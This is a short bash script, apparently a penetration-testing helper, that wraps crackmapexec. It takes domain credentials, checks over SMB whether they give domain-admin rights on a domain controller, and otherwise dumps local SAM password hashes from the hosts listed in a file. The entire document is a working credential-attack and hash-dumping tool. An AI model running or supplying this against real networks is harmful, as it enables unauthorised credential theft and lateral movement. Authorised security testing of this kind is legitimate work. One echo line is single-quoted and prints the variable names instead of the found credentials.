#!/bin/bash
echo '                               __               __    _             '
echo '    _________ ___  ___        / /_  ____ ______/ /_  (_)___  ____ _ '
echo '   / ___/ __ `__ \/ _ \______/ __ \/ __ `/ ___/ __ \/ / __ \/ __ `/ '
echo '  / /__/ / / / / /  __/_____/ /_/ / /_/ (__  ) / / / / / / / /_/ /  '
echo '  \___/_/ /_/ /_/\___/     /_.___/\__,_/____/_/ /_/_/_/ /_/\__, /   '
echo '                                                          /____/    '

read -p "Enter Domainname: " domain 
echo " "
read -p "Enter DC IP: " dc
echo " "
read -p "Enter Username: " user
echo " "
read -p "Enter Password: " pw
echo " "


crackmapexec smb $dc -u $user -p $pw | tee dc_check.txt
awk '/Pwn3d/ {print$7}' dc_check.txt | sed 's/(//' | sed 's/)//' | sed 's/!//' > pwnd.txt  

if [ -s pwnd.txt ]
	then 
	echo ''
	echo 'FOUND DOMADMIN'
	echo ''
	echo '$user $pw'

else
	crackmapexec smb smb.txt -u $user -p $pw --local-auth --sam | tee cme_first.txt
fi

